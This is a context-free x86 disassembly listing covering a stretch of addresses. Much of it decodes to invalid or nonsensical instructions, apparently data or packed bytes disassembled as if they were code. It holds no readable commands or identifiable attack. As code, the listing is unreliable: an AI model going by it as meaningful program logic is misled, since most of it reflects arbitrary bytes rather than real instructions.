  418f83:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  418f85:	(bad)  
  418f86:	cmp    al,dl
  418f88:	pusha  
  418f89:	add    edi,DWORD PTR [esi]
  418f8b:	pop    ebx
  418f8c:	mov    ss,WORD PTR [edx-0x21a03cc3]
  418f92:	cmp    BYTE PTR [eax-0x47d63f90],bh
  418f98:	add    dl,bh
  418f9a:	sub    eax,eax
  418f9c:	popf   
  418f9d:	jmp    0x418fdc
  418f9f:	pop    ebx
  418fa0:	push   eax
  418fa1:	data16 scas al,BYTE PTR es:[edi]
  418fa3:	scas   eax,DWORD PTR es:[edi]
  418fa4:	push   eax
  418fa5:	pop    esi
  418fa6:	lods   al,BYTE PTR ds:[esi]
  418fa7:	pop    ebx
  418fa8:	push   0x5b42e9
  418fad:	sar    DWORD PTR ds:0x25e9005f,0xce
  418fb4:	add    ecx,ebp
  418fb6:	cmp    eax,0xd4bdc064
  418fbb:	mov    al,ds:0x5b3d2d43
  418fc0:	add    cl,ch
  418fc2:	(bad)  
  418fc3:	push   ds
  418fc4:	cld    
  418fc5:	mov    ecx,0xeb67b7a7
	...
  418ff2:	add    BYTE PTR [eax],al
  418ff4:	xor    BYTE PTR [edi],ch
  418ff6:	clc    
  418ff7:	cmp    DWORD PTR ds:0x50ed71b8,0x4f
  418ffe:	mov    eax,ds:0xab77ab2
  419003:	sub    DWORD PTR [ecx+0x4574fd61],edi
  419009:	rol    BYTE PTR [ebx-0x1646cd02],0x19
  419010:	sub    ebp,DWORD PTR [edi]
  419012:	clc    
  419013:	shl    DWORD PTR [edi-0x143102b0],0xb7
  41901a:	cmp    eax,0x43a04228
  41901f:	mov    ebp,0xe9005b3a
  419024:	rcr    BYTE PTR [esi],0xfc
  419027:	sbb    DWORD PTR [edi+esi*4+0x41aaeb67],edx
  41902e:	add    BYTE PTR [esi-0x302a451],bl
  419034:	fisub  WORD PTR [edi+edi*1]
  419037:	jmp    0x4f2b72
  41903c:	stos   DWORD PTR es:[edi],eax
  41903d:	inc    edx
  41903e:	std    
  41903f:	jmp    DWORD PTR [edi]
  419041:	js     0x419087
  419043:	fdiv   st,st(7)
  419045:	pop    edx
  419046:	add    BYTE PTR [eax],al
  419048:	fdiv   st,st(6)
  41904a:	fld    DWORD PTR [ecx]
  41904c:	daa    
  41904d:	pop    ebx
  41904e:	add    bh,bh
  419050:	hlt    
  419051:	mov    dh,0x8e
  419053:	inc    ebp
  419054:	ja     0x4190a6
  419056:	jb     0x419060
	...
  419080:	add    BYTE PTR [eax],al
  419082:	pusha  
  419083:	mul    cl
  419085:	(bad)  
  419086:	stos   BYTE PTR es:[edi],al
  419087:	cmp    ch,0xff
  41908a:	out    0x5a,eax
  41908c:	lds    eax,FWORD PTR [ebp-0x7d]
  41908f:	pop    edi
  419090:	add    BYTE PTR [eax],al
  419092:	xlat   BYTE PTR ds:[ebx]
  419093:	ja     0x4190d9
  419095:	lock out 0x5a,eax
  419098:	add    BYTE PTR [eax],al
  41909a:	sbb    dh,dh
  41909c:	icebp  
  41909d:	add    bh,dl
  41909f:	pop    edx
  4190a0:	add    BYTE PTR [ebp-0xb28d66],cl
  4190a6:	cmp    cl,BYTE PTR [esi-0x1b]
  4190a9:	in     eax,0xa4
  4190ab:	pop    edx
  4190ac:	add    BYTE PTR [ebx],cl
  4190ae:	push   edi
  4190af:	retf   
  4190b0:	adc    eax,0xfd661283
  4190b5:	jae    0x419045
  4190b7:	dec    edi
  4190b8:	je     0x4190ae
  4190ba:	and    BYTE PTR [ebp+0x5f5648d4],dh
  4190c0:	lds    eax,FWORD PTR [ebp-0x35]
  4190c3:	pop    ecx
  4190c4:	add    BYTE PTR [eax],al
  4190c6:	add    DWORD PTR ds:0x1ac7,0x6b
  4190cc:	std    
  4190cd:	call   DWORD PTR [edi+0x5a]
  4190d0:	std    
  4190d1:	jne    0x419066
  4190d3:	dec    edi
  4190d4:	adc    al,0x97
  4190d6:	or     al,0x9a
  4190d8:	std    
  4190d9:	or     ah,BYTE PTR [edi+0x3ee81be6]
  4190df:	mov    ds:0x4141fe1a,al
  4190e4:	(bad)  
  4190e5:	mov    es,WORD PTR [eax]
	...
  41910f:	add    BYTE PTR [ebp-0x55fffb7d],al
  419115:	mov    esi,0x78b91414
  41911a:	sar    edi,0xf8
  41911d:	mov    esi,0xc47f472e
  419122:	add    al,BYTE PTR [eax]
  419124:	ds inc esp
  419126:	cmp    BYTE PTR [edx+esi*8-0x3d],0x8d
  41912b:	or     al,BYTE PTR [ecx]
  41912d:	(bad)  
  41912e:	or     eax,0x292073fe
  419133:	mov    edi,DWORD PTR ds:0x73ff01c4
  419139:	jo     0x419164
  41913b:	jae    0x41917c
  41913d:	les    eax,FWORD PTR [ecx]
  41913f:	cld    
  419140:	or     eax,0xd1fe5a84
  419145:	push   esp
  419146:	adc    al,0xf1
  419148:	cwde   
  419149:	mov    edi,esp
  41914b:	push   cs
  41914c:	mov    ebx,0xb9fe14a1
  419151:	sub    al,bh
  419153:	or     dl,BYTE PTR [ebp-0x5799813c]
  419159:	lods   al,BYTE PTR ds:[esi]
  41915a:	adc    DWORD PTR [edi+0x1c43f],esi
  419160:	stc    
  419161:	sbb    BYTE PTR [ebx],bh
  419163:	ret    0x28eb
  419166:	and    BYTE PTR [edx+0x57b48f82],al
  41916c:	push   ss
  41916d:	mov    bh,0x3
  41916f:	inc    ecx
  419170:	ds pushf 
  419172:	xchg   esi,eax
	...
  41919b:	add    BYTE PTR [eax],al
  41919d:	add    BYTE PTR [ebp-0xc],bh
  4191a0:	sahf   
  4191a1:	jmp    DWORD PTR [ecx+0x43]
  4191a4:	push   es
  4191a5:	add    BYTE PTR [esi],bh
  4191a7:	pushf  
  4191a8:	shl    BYTE PTR [eax],cl
  4191aa:	pop    ecx
  4191ab:	pop    edx
  4191ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ad:	sbb    al,0x52
  4191af:	scas   eax,DWORD PTR es:[edi]
  4191b0:	sahf   
  4191b1:	adc    esp,DWORD PTR [ecx-0x5c]
  4191b4:	into   
  4191b5:	adc    al,BYTE PTR [eax-0x3e]
  4191b8:	(bad)  
  4191b9:	jmp    0x4191f3
  4191bb:	mov    ch,0xf2
  4191bd:	inc    ebx
  4191be:	lods   eax,DWORD PTR ds:[esi]
  4191bf:	dec    eax
  4191c0:	(bad)  
  4191c1:	sub    eax,0xff76b461
  4191c6:	loope  0x4191f7
  4191c8:	loope  0x419214
  4191ca:	inc    edx
  4191cb:	retf   
  4191cc:	mov    ah,0xc4
  4191ce:	adc    DWORD PTR [edi+eiz*8+0x3],ebx
  4191d2:	ds inc ebx
  4191d4:	call   0x3f9ccfdd
  4191d9:	ret    0xb453
  4191dc:	inc    esi
  4191dd:	addr16 push es
  4191df:	sub    DWORD PTR [eax+0x331f0103],ebp
  4191e5:	add    eax,0x80e75b3f
  4191ea:	xor    BYTE PTR [edi-0x5df5ed49],0x9a
  4191f1:	(bad)  
  4191f2:	leave  
  4191f3:	mov    esp,0x5b3e058f
  4191f8:	loop   0x41923d
  4191fa:	xor    cl,BYTE PTR [esi+0x6]
  4191fd:	fld    DWORD PTR [esi+0x3a828]
	...
  41922b:	add    BYTE PTR [esi-0x5fed229a],dl
  419231:	pushf  
  419232:	in     al,0x3c
  419234:	or     al,0x1a
  419236:	out    0x3,eax
  419238:	ds pop ebx
  41923a:	out    0x1b,eax
  41923c:	jmp    0x419294
  41923e:	(bad)  
  41923f:	adc    bl,BYTE PTR [ecx+0x7812f076]
  419245:	inc    ebx
  419246:	sbb    eax,0xcf5afecb
  41924b:	cmp    DWORD PTR [edx-0x4c],esi
  41924e:	add    BYTE PTR [esi+0x62539922],dh
  419254:	cmp    DWORD PTR [eax+ebx*2],esp
  419257:	adc    eax,edi
  419259:	pop    ecx
  41925a:	aas    
  41925b:	jmp    0xaa40bc95
  419260:	sub    al,0x42
  419262:	add    BYTE PTR [ecx-0x16ffa47e],al
  419268:	test   DWORD PTR [ebp+edi*8-0x3d5dc217],esi
  41926f:	in     eax,dx
  419270:	cmp    eax,0x4c01580b
  419275:	pop    edx
  419276:	aas    
  419277:	jmp    0x2a40bcc1
  41927c:	sub    al,0x3c
  41927e:	mov    cl,0xeb
  419280:	cli    
  419281:	mov    bl,0xe5
  419283:	add    DWORD PTR [edx+0x5b],0xb4df5100
  41928a:	std    
  41928b:	ds inc ebp
  41928d:	and    esi,ebx
  41928f:	add    BYTE PTR ss:[eax],al
	...
  4192ba:	dec    esp
  4192bb:	mov    esp,0xb52c36ed
  4192c0:	call   0xfdf6d805
  4192c5:	push   0xffffffee
  4192c7:	jecxz  0x419314
  4192c9:	test   al,0x3d
  4192cb:	pop    ebx
  4192cc:	je     0x4192be
  4192ce:	shl    BYTE PTR [esi-0x73],0xb2
  4192d2:	jp     0x419287
  4192d4:	std    
  4192d5:	jne    0x41930e
  4192d7:	mov    ah,0x13
  4192d9:	data16 loopne 0x4192f6
  4192dc:	add    BYTE PTR [esi],ah
  4192de:	inc    esi
  4192df:	mov    cs,WORD PTR [eax+0x28]
  4192e2:	cmp    bl,BYTE PTR [edx+0x0]
  4192e5:	jmp    0xd5574ea7
  4192ea:	das    
  4192eb:	mov    ch,0xe8
  4192ed:	repz dec eax
  4192ef:	mov    ch,0xfd
  4192f1:	add    BYTE PTR [esi+ebp*8+0x5e726855],ah
  4192f8:	aas    
  4192f9:	add    BYTE PTR [edi-0x573cff34],ch
  4192ff:	push   esi
  419300:	xor    eax,0xb7576701
  419305:	pop    es
  419306:	push   edi
  419307:	push   edi
  419308:	add    BYTE PTR [ebx],dh
  41930a:	test   DWORD PTR [ecx-0x10],edx
  41930d:	or     ebp,0x5a
  419310:	jae    0x419314
  419312:	int3   
  419313:	pop    ecx
  419314:	jmp    0xff206302
  419319:	jmp    FWORD PTR [eax+0xfa724f]
	...
  419347:	add    BYTE PTR [eax+0x6f00674c],ch
  41934d:	xchg   edx,eax
  41934e:	add    BYTE PTR [eax],al
  419350:	pop    ss
  419351:	jae    0x419351
  419353:	and    eax,0x40ddc7
  419358:	mov    BYTE PTR [edx+0x5ea68151],bh
  41935e:	std    
  41935f:	and    eax,0x40dd9f
  419364:	sub    BYTE PTR [edx+0x5ea68159],bh
  41936a:	std    
  41936b:	and    eax,0x40ddc7
  419370:	sub    BYTE PTR [edx+0x5e968161],bh
  419376:	std    
  419377:	and    eax,0x40ddbf
  41937c:	cmp    BYTE PTR [edx+0x5ed68169],bh
  419382:	std    
  419383:	and    eax,0x40dd27
  419388:	test   al,0xb9
  41938a:	jno    0x41930d
  41938c:	push   di
  41938e:	std    
  41938f:	and    eax,0x40de1f
  419394:	ds mov esi,esp
  419397:	jnp    0x419358
  419399:	add    DWORD PTR [edi+edi*8],0x1b
  41939d:	inc    esp
  41939e:	add    BYTE PTR [eax+0x3e],0xf1
  4193a2:	out    0x83,al
  4193a4:	mov    edi,0x23ff0483
  4193a9:	cmp    al,0x82
  4193ab:	inc    eax
	...
  4193d4:	add    BYTE PTR [eax],al
  4193d6:	ds stc 
  4193d8:	out    0x8b,al
  4193da:	mov    edi,0x1bff0483
  4193df:	xor    al,0x82
  4193e1:	inc    eax
  4193e2:	ds loope 0x4193cb
  4193e5:	xchg   ebx,eax
  4193e6:	mov    edi,0x63ff0482
  4193eb:	cmp    al,0x82
  4193ed:	inc    eax
  4193ee:	ds sub esi,esp
  4193f1:	fwait
  4193f2:	mov    edi,0x5bff0482
  4193f7:	in     al,0x82
  4193f9:	inc    eax
  4193fa:	ds adc esi,esp
  4193fd:	mov    ds:0xff0202bf,eax
  419402:	and    ebx,esp
  419404:	add    BYTE PTR [eax+0x3e],0x19
  419408:	out    0xab,al
  41940a:	mov    edi,0x1bff0202
  41940f:	xor    al,0x82
  419411:	inc    eax
  419412:	ds and esi,0x202bfb3
  419419:	jmp    DWORD PTR [ebx]
  41941b:	cmp    al,0x82
  41941d:	inc    eax
  41941e:	ds dec ecx
  419420:	out    0xbb,al
  419422:	mov    edi,0x5bff0202
  419427:	test   BYTE PTR [edx-0x1c4ec1c0],al
  41942d:	ret    
  41942e:	mov    edi,0x63ff0202
  419433:	jl     0x4193b7
  419435:	inc    eax
  419436:	ds pop ebx
  419438:	out    0xe9,al
	...
  419462:	add    BYTE PTR [eax],al
  419464:	jne    0x419441
  419466:	sub    BYTE PTR [ecx+eax*4],al
  419469:	ja     0x419422
  41946b:	test   esi,edi
  41946d:	pop    edx
  41946e:	into   
  41946f:	jmp    0x46a7001
  419474:	imul   esi,DWORD PTR [edi-0x61],0xb65afe85
  41947b:	jmp    0x46a6ff5
  419480:	push   ecx
  419481:	ja     0x41940a
  419483:	test   esi,edi
  419485:	pop    edx
  419486:	sahf   
  419487:	jmp    0x46a6fe9
  41948c:	cmp    DWORD PTR [edi+0x7f],esi
  41948f:	test   DWORD PTR [esi+0x5b],edi
  419492:	xchg   cl,ch
  419494:	adc    eax,0x210428db
  419499:	ja     0x419512
  41949b:	test   DWORD PTR [esi+0x5b],edi
  41949e:	outs   dx,BYTE PTR ds:[esi]
  41949f:	jmp    0x3ea6fb1
  4194a4:	or     DWORD PTR [edi+0x5f],esi
  4194a7:	test   DWORD PTR [esi+0x5b],edi
  4194aa:	push   esi
  4194ab:	jmp    0x3ea6fa5
  4194b0:	icebp  
  4194b1:	jbe    0x41949a
  4194b3:	cmp    DWORD PTR [esi+0x5b],0xdd3de93e
  4194ba:	test   al,0x3
  4194bc:	fnstenv [esi-0x21]
  4194bf:	cmp    DWORD PTR [esi+0x5b],0xdd35e926
  4194c6:	test   al,0x3
	...
  4194f0:	add    BYTE PTR [eax],al
  4194f2:	shl    DWORD PTR [esi-0x9],0x81
  4194f6:	(bad)  
  4194f7:	pop    edx
  4194f8:	push   cs
  4194f9:	jmp    0x3ea724b
  4194fe:	test   eax,0xfe81df76
  419503:	pop    edx
  419504:	add    dh,dh
  419506:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419507:	push   esp
  419508:	sub    BYTE PTR [eax+0xd23b03d],0xbc
  41950f:	sbb    eax,DWORD PTR [eax]
  419511:	ficom  WORD PTR [esi+0x42288278]
  419517:	mov    al,0x23
  419519:	std    
  41951a:	mov    edi,0x56c6001b
  41951f:	add    BYTE PTR [edx+0x23b03a28],0xfd
  419526:	mov    edi,0x66ae001b
  41952b:	push   0xb0422882
  419530:	and    ebp,DWORD PTR [ecx]
  419532:	mov    esp,0x2696001b
  419537:	sbb    BYTE PTR [edx+0x23b03a28],al
  41953d:	xor    eax,0x7e001abc
  419542:	push   ss
  419543:	and    BYTE PTR [edx+0x23b04228],al
  419549:	adc    eax,0x66001abc
  41954e:	push   ss
  41954f:	or     BYTE PTR [edx+0x23b03da8],al
  419555:	mov    ch,0x0
	...
  41957f:	add    BYTE PTR [edi-0x19b1ffe6],bh
  419585:	jb     0x23f1d333
  41958b:	lds    edi,FWORD PTR [edi-0x19c9ffe6]
  419591:	aaa    
  419592:	sub    BYTE PTR [eax-0x6adc4fc3],0xbf
  419599:	sbb    al,BYTE PTR [eax]
  41959b:	push   ds
  41959c:	(bad)  
  41959d:	aas    
  41959e:	sub    BYTE PTR [eax-0x6edc4fc3],0xbf
  4195a5:	sbb    al,BYTE PTR [eax]
  4195a7:	add    BYTE PTR [eax-0x3d],al
  4195aa:	jge    0x41952e
  4195ac:	(bad)  
  4195ad:	pop    ebx
  4195ae:	std    
  4195af:	and    eax,0x40da2b
  4195b4:	mov    al,ds:0x568289b7
  4195b9:	push   edi
  4195ba:	std    
  4195bb:	and    eax,0x40dd07
  4195c0:	nop
  4195c1:	mov    bh,0x91
  4195c3:	and    BYTE PTR [esi],0x57
  4195c6:	std    
  4195c7:	and    eax,0x40dcdf
  4195cc:	mov    al,ds:0x268299b7
  4195d1:	push   edi
  4195d2:	std    
  4195d3:	and    eax,0x40dcc7
  4195d8:	mov    al,ds:0x1682a5b7
  4195dd:	push   edi
  4195de:	std    
  4195df:	and    eax,0x40d983
	...
  41960c:	add    BYTE PTR [eax],al
  41960e:	shl    BYTE PTR [esi+0x575682ad],0xfd
  419615:	and    eax,0x40d96b
  41961a:	nop
  41961b:	mov    dh,0xb5
  41961d:	and    BYTE PTR [esi+0x57],0xfd
  419621:	and    eax,0x40d9e3
  419626:	pusha  
  419627:	mov    dh,0xbd
  419629:	and    BYTE PTR [esi+0x1b25fd5a],0xd9
  419630:	inc    eax
  419631:	add    BYTE PTR [eax-0x697d3a4a],al
  419637:	pop    edx
  419638:	std    
  419639:	and    eax,0x40d923
  41963e:	and    BYTE PTR [esi+0x5a9682d1],dh
  419644:	std    
  419645:	and    eax,0x40d97f
  41964a:	ds cmp eax,ecx
  41964d:	and    edi,DWORD PTR [edx]
  41964f:	inc    ecx
  419650:	or     al,0x1
  419652:	sub    ebp,DWORD PTR [ecx+ecx*2+0x1c43e63]
  419659:	ret    0xc442
  41965c:	xor    bh,0x3a
  41965f:	aas    
  419660:	stc    
  419661:	mov    bh,0x3c
  419663:	les    eax,FWORD PTR [ecx]
  419665:	add    BYTE PTR [eax+edi*4+0x1],bh
  419669:	xor    DWORD PTR [esi-0x44],0xffffff8e
  41966d:	pop    es
  41966e:	mov    dh,0xb8
  419670:	add    DWORD PTR [eax],eax
	...
  41969a:	add    BYTE PTR [eax],al
  41969c:	add    al,BYTE PTR ds:[esi]
  41969f:	add    BYTE PTR [ebp+0x467cf19c],bh
  4196a5:	sub    al,0x3
  4196a7:	add    BYTE PTR [esi],bh
  4196a9:	les    edi,FWORD PTR [edi]
  4196ab:	add    edi,DWORD PTR [esi]
  4196ad:	inc    ecx
  4196ae:	or     DWORD PTR [edi],ebx
  4196b0:	ret    
  4196b1:	stos   DWORD PTR es:[edi],eax
  4196b2:	dec    ecx
  4196b3:	pop    es
  4196b4:	les    eax,FWORD PTR ds:[ecx]
  4196b7:	ret    0xc43a
  4196ba:	xor    bh,0x7e
  4196bd:	push   edi
  4196be:	cld    
  4196bf:	mov    bh,0x34
  4196c1:	les    eax,FWORD PTR [ecx]
  4196c3:	add    ah,bh
  4196c5:	mov    edi,0xc3be3d01
  4196ca:	add    DWORD PTR [eax],eax
  4196cc:	mov    ebp,DWORD PTR [ecx+ecx*2+0x1c43e0b]
  4196d3:	ret    0xc442
  4196d6:	into   
  4196d7:	(bad)  
  4196d8:	les    eax,FWORD PTR ds:[ecx]
  4196db:	jge    0x419713
  4196dd:	fdiv   st(3),st
  4196df:	jmp    ecx
  4196e1:	ret    
  4196e2:	aas    
  4196e3:	add    edi,DWORD PTR [esi]
  4196e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196e6:	add    DWORD PTR [edx],eax
  4196e8:	les    ecx,FWORD PTR ds:[esi-0x8a579f9]
  4196ef:	add    edi,DWORD PTR [esi]
  4196f1:	pop    ebx
  4196f2:	sub    DWORD PTR [edi],eax
  4196f4:	ds jo  0x4196de
  4196f7:	pop    es
  4196f8:	ds pop ebx
  4196fa:	mov    ebx,?
  4196fc:	icebp  
  4196fd:	dec    eax
  4196fe:	out    0x3,eax
	...
  419728:	add    BYTE PTR [eax],al
  41972a:	ds cdq 
  41972c:	jecxz  0x419731
  41972e:	pop    ebx
  41972f:	pop    ebx
  419730:	fild   WORD PTR [ebx]
  419732:	ds xor bh,bl
  419735:	dec    ebx
  419736:	sub    eax,0x7c03e75b
  41973b:	push   esi
  41973c:	out    0xc8,eax
  41973e:	jns    0x41979d
  419740:	out    0x3,eax
  419742:	repz bound ecx,QWORD PTR [edi-0x1852960e]
  419749:	inc    ebp
  41974a:	cmp    eax,0x1e03fc5b
  41974f:	pop    ebx
  419750:	out    0x88,eax
  419752:	cmp    ebx,esi
  419754:	iret   
  419755:	add    edi,DWORD PTR [esi]
  419757:	pop    ebx
  419758:	test   eax,0xe7703e00
  41975d:	ret    
  41975e:	cmp    DWORD PTR [ebp+0x51e9fc14],ebp
  419764:	out    0x3,eax
  419766:	ds cdq 
  419768:	jmp    0x41976d
  41976a:	arpl   WORD PTR [ebx+0x67],bx
  41976d:	add    al,0x3e
  41976f:	fisttp WORD PTR cs:[ebx+0x35]
  419773:	pop    ebx
  419774:	out    0x3,eax
  419776:	cld    
  419777:	push   edi
  419778:	out    0xd6,eax
  41977a:	imul   BYTE PTR [esi-0x19]
  41977d:	add    edi,DWORD PTR [edi]
  41977f:	pop    ebx
  419780:	out    0x68,al
  419782:	(bad)  
  419783:	ficomp WORD PTR [ebx+0x28e04bfc]
  419789:	inc    esi
  41978a:	cmp    eax,0x856a5b
	...
  4197b7:	add    BYTE PTR ds:0x3de90057,dh
  4197bd:	lods   al,BYTE PTR ds:[esi]
  4197be:	jae    0x41978c
  4197c0:	dec    eax
  4197c1:	fist   DWORD PTR [eax]
  4197c3:	in     eax,dx
  4197c4:	cmp    eax,0xaa68875b
  4197c9:	pop    eax
  4197ca:	add    cl,ch
  4197cc:	jge    0x419763
  4197ce:	jg     0x4197bd
  4197d0:	test   eax,0x3df1fdac
  4197d5:	pop    ebx
  4197d6:	add    BYTE PTR [eax-0x3d],dh
  4197d9:	pop    esp
  4197da:	add    al,0xe9
  4197dc:	cmp    eax,0x89c57cd8
  4197e1:	lods   al,BYTE PTR ds:[esi]
  4197e2:	mov    dh,BYTE PTR [eax-0x6b]
  4197e5:	pop    eax
  4197e6:	add    cl,ch
  4197e8:	leave  
  4197e9:	popa   
  4197ea:	mov    ch,al
  4197ec:	cmp    ebx,DWORD PTR [ebx+0x5ae5a9fe]
  4197f2:	ret    0x3ded
  4197f5:	mov    ebx,DWORD PTR [edi]
  4197f7:	stos   DWORD PTR es:[edi],eax
  4197f8:	pop    ecx
  4197f9:	lods   al,BYTE PTR ds:[esi]
  4197fa:	sub    BYTE PTR [eax+0x59],0x58
  4197fe:	add    cl,ch
  419800:	xor    al,0x27
  419802:	sbb    esi,DWORD PTR [edx-0x46]
  419805:	pop    esp
  419806:	add    al,0xe9
  419808:	cmp    eax,0x31f17fe2
  41980d:	lods   al,BYTE PTR ds:[esi]
  41980e:	std    
  41980f:	sub    DWORD PTR [ebp-0x25],edi
  419812:	sbb    al,0xed
  419814:	cmp    eax,0x3de9085b
  419819:	pop    ebx
  41981a:	xchg   DWORD PTR [eax+0x0],ebp
	...
  419845:	add    BYTE PTR ds:0x88e90058,cl
  41984b:	jecxz  0x419865
  41984d:	in     eax,dx
  41984e:	cmp    eax,0x8108d05b
  419853:	fnstcw WORD PTR [edi-0xb]
  419856:	icebp  
  419857:	stos   DWORD PTR es:[edi],eax
  419858:	std    
  419859:	dec    esi
  41985a:	into   
  41985b:	dec    esi
  41985c:	mov    DWORD PTR [eax],eax
  41985e:	push   esi
  41985f:	test   al,0x1
  419861:	add    bh,ah
  419863:	sbb    BYTE PTR cs:[eax],0xe3
  419867:	push   edi
  419868:	add    BYTE PTR [eax+0x20],al
  41986b:	xlat   BYTE PTR ds:[ebx]
  41986c:	sbb    DWORD PTR [edi+edx*8],eax
  41986f:	push   edi
  419870:	or     BYTE PTR [eax],al
  419872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419873:	push   edi
  419874:	xchg   DWORD PTR [ecx-0x25449],eax
  41987a:	sbb    al,0x2f
  41987c:	adc    eax,0x8a579704
  419881:	add    DWORD PTR [ebp+0x1fc0fb17],esp
  419887:	push   edi
  419888:	ror    DWORD PTR [ebx-0x74fe741d],0x43
  41988f:	mov    ebx,0xea315501
  419894:	xor    dh,dh
  419896:	(bad)  
  419898:	std    
  419899:	mov    cl,BYTE PTR [edi-0x39fe192b]
  41989f:	dec    esi
  4198a0:	inc    ebx
  4198a1:	lea    esi,[ebx-0x16]
  4198a4:	cmp    al,0x66
  4198a7:	retf   0x83ed
	...
  4198d2:	add    BYTE PTR [eax],al
  4198d4:	mov    DWORD PTR [edi-0x45],edx
  4198d7:	call   FWORD PTR [eax+0x5a8dfe61]
  4198dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198de:	jno    0x419952
  4198e0:	je     0x41990a
  4198e2:	inc    BYTE PTR [ecx]
  4198e4:	jle    0x419899
  4198e6:	add    DWORD PTR [eax],eax
  4198e8:	pop    ss
  4198e9:	ficomp DWORD PTR [eax]
  4198eb:	mov    esp,DWORD PTR [esi+0x270001af]
  4198f1:	sbb    BYTE PTR es:[eax],0x23
  4198f5:	pop    edi
  4198f6:	add    BYTE PTR [eax-0x72],al
  4198f9:	push   ss
  4198fa:	sbb    DWORD PTR [edi+eiz*8],eax
  4198fd:	pop    esi
  4198fe:	xchg   DWORD PTR [ecx-0x25bc2],eax
  419904:	jmp    0x3a591a46
  419909:	mov    ah,0x1
  41990b:	idiv   ah
  41990d:	mov    bl,0x8d
  41990f:	or     esp,eax
  419911:	mov    WORD PTR [ebx],es
  419913:	fcmovne st,st(0)
  419915:	jne    0x419993
  419917:	pop    ss
  419918:	aad    0xb6
  41991a:	xor    DWORD PTR [edi],ebx
  41991c:	aas    
  41991d:	or     ebp,eax
  41991f:	add    edi,DWORD PTR [esi]
  419921:	mov    ah,0x8e
  419923:	sbb    BYTE PTR [ebp+0x3e03f433],dh
  419929:	mov    ah,0x7a
  41992b:	xor    BYTE PTR [esi],0xc0
  41992e:	add    DWORD PTR [eax],eax
  419930:	(bad)  
  419931:	cmp    cl,BYTE PTR [ecx+0x1b]
  419934:	inc    edx
  419935:	mov    ah,0x1
  419937:	mov    DWORD PTR [eax],eax
	...
  419961:	add    BYTE PTR [edi+0x79fffda4],bh
  419967:	sub    eax,0xb43a1782
  41996c:	add    DWORD PTR [edx-0x2d349ba],ecx
  419972:	jge    0x419937
  419974:	sbb    eax,DWORD PTR [edx+0x1779b368]
  41997a:	retf   
  41997b:	add    eax,0x989700ac
  419980:	std    
  419981:	inc    DWORD PTR [ecx+0x47]
  419984:	jmp    0xfde55913
  419989:	push   DWORD PTR [ecx]
  41998b:	cmp    eax,DWORD PTR [edx+0x1b44217]
  419991:	inc    eax
  419992:	mov    bh,0x1a
  419994:	in     eax,0x3
  419996:	ds mov ah,0x7a
  419999:	sub    BYTE PTR [esi],0xb8
  41999c:	add    DWORD PTR [eax],eax
  41999e:	mov    ch,0x32
  4199a0:	jmp    0xe79cd7a8
  4199a5:	adc    edi,edi
  4199a7:	pop    ebx
  4199a8:	sar    ebp,cl
  4199aa:	(bad)  
  4199ab:	dec    edx
  4199ac:	jmp    0x5fde84e6
  4199b1:	repz aam 0x5c
  4199b4:	pop    ss
  4199b5:	jecxz  0x4199f5
  4199b7:	hlt    
  4199b8:	(bad)  
  4199ba:	shr    DWORD PTR [ecx-0x244b1544],1
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	inc    ecx
  4199c3:	test   eax,0x8270
	...
  4199f0:	push   ecx
  4199f1:	pop    edi
  4199f2:	out    0x3,eax
  4199f4:	(bad)  
  4199f5:	rcl    DWORD PTR [eax-0x19],cl
  4199f8:	cmp    eax,0xbe7ae75b
  4199fd:	dec    edx
  4199fe:	jmp    0x419a03
  419a00:	ds (bad) 
  419a02:	jo     0x4199ef
  419a04:	cmp    eax,0x5e33e75b
  419a09:	or     cl,BYTE PTR [ebp-0x18a1805a]
  419a0f:	mov    dl,0x12
  419a11:	(bad)  
  419a12:	dec    ebx
  419a13:	loopne 0x419a56
  419a15:	adc    DWORD PTR [edx],ebx
  419a17:	inc    esp
  419a18:	adc    dh,bl
  419a1a:	int3   
  419a1b:	imul   ebx
  419a1d:	pop    edi
  419a1e:	test   bh,dh
  419a20:	pop    ecx
  419a21:	test   eax,0x7ed57ae7
  419a26:	fstp   TBYTE PTR [edx+0x50]
  419a29:	jne    0x4199df
  419a2b:	jns    0x419a0a
  419a2d:	jle    0x419a16
  419a2f:	jns    0x419a89
  419a31:	ffreep st(2)
  419a33:	nop
  419a34:	push   ecx
  419a35:	aam    0xa4
  419a37:	jnp    0x419a4c
  419a39:	xlat   BYTE PTR ds:[ebx]
  419a3a:	jb     0x419a40
  419a3c:	ds pop ebx
  419a3e:	out    0xc9,eax
  419a40:	aaa    
  419a41:	das    
  419a42:	in     eax,0xbc
  419a44:	jg     0x419a24
  419a46:	add    BYTE PTR [eax-0x567e5151],ah
  419a4c:	add    eax,esp
  419a4e:	(bad)  
  419a4f:	fdivr  st(5),st
  419a51:	ffree  st(0)
  419a53:	jmp    0x419a55
	...
  419a7d:	add    BYTE PTR [ebp+ebx*2-0x7f],dl
  419a81:	sub    ecx,ebp
  419a83:	and    DWORD PTR [esi+0x6a],eax
  419a86:	(bad)  
  419a87:	jl     0x419aa5
  419a89:	call   0x9f9f313c
  419a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a8f:	add    eax,0xd43de5c2
  419a94:	push   esp
  419a95:	add    eax,0x72560e3e
  419a9a:	push   ebx
  419a9b:	mov    eax,ds:0xa8b1d186
  419aa0:	std    
  419aa1:	jmp    0x6341f5e3
  419aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419aa7:	fadd   st(7),st
  419aa9:	neg    BYTE PTR [ecx]
  419aab:	js     0x419aac
  419aad:	call   0x75caaaef
  419ab2:	imul   ecx,DWORD PTR [ecx+eax*4-0x12],0xa6032e88
  419aba:	jo     0x419a64
  419abc:	std    
  419abd:	jmp    0xae6b34b6
  419ac2:	in     eax,dx
  419ac3:	popa   
  419ac4:	or     BYTE PTR [ebp-0x5c],dl
  419ac7:	sbb    DWORD PTR [eax+0x6c],eax
  419aca:	inc    eax
  419acb:	das    
  419acc:	imul   BYTE PTR [edx-0x2d]
  419acf:	inc    ebx
  419ad0:	add    al,0xe9
  419ad2:	cmp    eax,0xc4cc73a8
  419ad7:	fst    QWORD PTR [eax]
  419ad9:	in     eax,dx
  419ada:	cmp    eax,0x2567875b
